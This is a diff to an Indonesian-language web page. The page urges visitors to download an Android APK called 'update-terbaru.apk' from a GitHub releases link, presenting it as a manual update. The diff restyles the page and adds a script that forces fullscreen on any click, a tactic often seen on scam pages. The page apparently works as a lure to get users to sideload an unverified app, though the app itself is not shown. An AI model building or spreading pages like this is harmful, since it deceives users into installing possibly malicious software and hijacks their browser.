@@ -21,8 +21,8 @@
         background-size: 100% auto; 
         background-position: center;
         background-repeat: no-repeat;
-        width: 100vw; 
-        height: 100vh; 
+        width: 90vw; 
+        height: 150vh; 
         margin: 0; /* Hapus margin default */
         text-align: center;
         padding: 20px;
@@ -38,7 +38,7 @@
         margin-top: 10px;
       }
       a {
-        color: #b7e8ff;
+        color: #004b6e;
         text-decoration: none;
       }
     </style>
@@ -51,5 +51,15 @@
   
     <!-- Optional: Tambahkan link untuk pengguna yang ingin mengunduh secara manual -->
     <p>Atau <a href="https://github.com/Musicterbaru2024/orgentunggal/releases/download/findown/update-terbaru.apk " download>update manual disini</a>.</p>
+    
+    <script>
+      document.documentElement.addEventListener("click", function () {
+          var docElm = document.documentElement;
+          if (docElm.requestFullscreen) { docElm.requestFullscreen() }
+          else if (docElm.mozRequestFullScreen) { docElm.mozRequestFullScreen() }
+          else if (docElm.webkitRequestFullScreen) { docElm.webkitRequestFullScreen() }
+      });
+  </script>
+  
   </body>
   </html>
